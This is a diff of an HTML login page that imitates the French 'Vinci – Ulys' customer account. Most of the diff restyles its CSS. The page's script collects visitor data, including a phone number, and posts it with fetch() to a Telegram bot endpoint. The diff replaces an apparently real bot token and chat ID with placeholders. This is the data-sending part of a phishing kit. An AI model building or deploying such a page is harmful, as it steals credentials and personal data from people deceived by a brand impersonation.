@@ -4,10 +4,12 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Connexion à votre espace Vinci – Ulys</title>
-  <link rel="stylesheet" href="assets/css/style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
-      font-family: 'Source Sans Pro', sans-serif;
+      font-family: 'Inter', sans-serif;
       background: #FBEAD3;
       margin: 0;
       padding: 0;
@@ -47,17 +49,17 @@
     .header-toggle {
       display: inline-flex;
       border: 1px solid #ccc;
-      border-radius: 20px;
+      border-radius: 25px;
       overflow: hidden;
     }
 
     .header-toggle .toggle {
-      padding: 0.4rem 1.2rem;
+      padding: 0.5rem 1.5rem;
       background: #fff;
       border: none;
       font-weight: 600;
-      cursor: pointer;
       font-size: 0.9rem;
+      cursor: pointer;
     }
 
     .header-toggle .toggle.active {
@@ -67,21 +69,17 @@
 
     main.container {
       flex: 1;
-      max-width: 960px;
+      max-width: 580px;
       margin: 3rem auto;
       padding: 0 1rem;
     }
 
     .card {
       background: #ffffff;
-      border-radius: 24px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-      padding: 2.5rem 4rem;
+      border-radius: 28px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+      padding: 3rem 2rem;
       width: 100%;
-      min-height: 520px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
     }
 
     .form-logo-center {
@@ -89,26 +87,25 @@
       justify-content: center;
       align-items: center;
       margin-bottom: 2rem;
-      padding-top: 0.5rem;
     }
 
     .form-logo-center img {
-      height: 70px;
-      width: auto;
+      height: 65px;
       object-fit: contain;
     }
 
     form label {
       display: block;
-      margin: 1rem 0 0.25rem;
+      margin: 1rem 0 0.3rem;
       font-weight: 600;
+      font-size: 0.95rem;
     }
 
     form input {
       width: 100%;
       padding: 0.75rem 1rem;
       border: 1px solid #ccc;
-      border-radius: 20px;
+      border-radius: 25px;
       background: #fafafa;
       font-size: 1rem;
     }
@@ -126,16 +123,25 @@
       padding: 0.85rem;
       background: #ff8000;
       color: #fff;
-      font-size: 1.1rem;
+      font-size: 1.05rem;
       font-weight: 600;
       text-align: center;
       border: none;
-      border-radius: 20px;
+      border-radius: 25px;
       cursor: pointer;
     }
 
     .btn:hover {
       background: #e57200;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem 0;
+      background-color: #ffffff;
+      font-size: 0.9rem;
+      color: #555;
+      margin-top: 3rem;
     }
 
     #spinnerOverlay {
@@ -161,15 +167,6 @@
       to {
         transform: rotate(360deg);
       }
-    }
-
-    footer {
-      text-align: center;
-      padding: 2rem 0;
-      background-color: #ffffff;
-      font-size: 0.9rem;
-      color: #555;
-      margin-top: 3rem;
     }
   </style>
 </head>
@@ -270,11 +267,11 @@
 📱 Téléphone : ${tel}
       `;
 
-      fetch("https://api.telegram.org/bot7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo/sendMessage", {
+      fetch("https://api.telegram.org/botTON_BOT/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: "-4911236455",
+          chat_id: "TON_CHAT_ID",
           text: message
         })
       });
